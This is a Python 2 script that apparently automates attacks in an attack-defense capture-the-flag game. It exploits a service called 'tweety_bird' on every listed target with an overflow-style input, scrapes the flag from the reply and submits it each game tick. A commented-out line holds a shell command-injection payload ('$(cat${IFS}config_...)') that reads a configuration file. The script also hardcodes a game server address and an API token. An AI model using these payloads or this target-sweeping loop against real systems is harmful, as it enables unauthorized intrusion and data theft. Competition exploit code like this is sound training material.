from swpag_client import Team
import json
import socket
import time
from pprint import pprint
import traceback

def netcat(hostname, port, content):
    print 'content:', content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    ret_list = []
    i = 0
    while i<20:
        data = s.recv(1024)
        print repr(data)
        if data == "":
            break
        ret_list.append(repr(data))
        i += 1
        #print "Received:", repr(data)
    #print "Connection closed."
    s.close()
    return ret_list

def exploit_tweety(hostname, port, flagId):
    print 'hostname:',hostname, 'port:',port, 'flagId:', flagId
    #content = ['2016'+ "\n"]#, 'east' + "\n", '1' + "\n", 'east'+"\n", 'get '+flagId + "\n"]# + '1' + "\n" + 'get '+flagId + "\n" #+ 'a' + "\n" + '$(cat${IFS}config_'+flagId+')' "\n"+ 's'+ "\n"
    #ret_list = chattingnetcat(hostname, port, content)
    content =  'R'+ "\n" + flagId + "\n" + 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab' + "\n"
    ret_list = netcat(hostname, port, content)
    print 'ret_list:'
    pprint(ret_list)
    pprint(ret_list[1].split('\\n')[1].split()[2])
    flag = ret_list[1].split('\\n')[1].split()[2]
    print 'FLAG================================================================================================:', flag
    print(t.submit_flag([flag]))

def exploitServices():

    # exit()
    print(t.get_service_list())
    # t.get_targets(service_id)
    services = t.get_service_list()
    print('services:', services)
    print()
    print()
    for service in services:
        print 'SERVICE NAME:', service
        print 'SERVICE ID:', service['service_id']
        service_id = service['service_id']
        service_name = service['service_name']
        print 'service_name:', service_name
        targets = t.get_targets(service_id)
        for target in targets:
            print('TARGET NAME:', target)  # ,netcat(target,''))
            hostname = target['hostname']
            port = target['port']
            flag_id = target['flag_id']
            if service_name == 'no-rsa':
                try:
                    pass
                    # exploit_no_rsa(hostname,port,flag_id)
                except:
                    print 'Exception occured for user'
            elif service_name == 'tweety_bird':
                try:
                    # pass
                    exploit_tweety(hostname, port, flag_id)
                except Exception:
                    traceback.print_exc()
                    print 'Exception occured for user:'
            # break

#exploit_dungeon('localhost', 20002, 'flag19')
#exit()

t = Team("http://52.9.73.146/", "y0o3RPgyhKPENe7AMuMFbl06WYOQPBOr")
print(t.game_url)
#print(t.get_vm())
while True:
    gameStatus = t.get_game_status()
    print('gameStatus:', gameStatus)
    currentTick = gameStatus['tick']['tick_id']
    exploitServices()
    while True:
        newGameStatus = t.get_game_status()
        newTick = newGameStatus['tick']['tick_id']
        print 'Checking new tick:',newTick
        if newTick != currentTick:
            print("Tick has changed so waiting for 25 more seconds")
            time.sleep(25)
            break
        time.sleep(10)
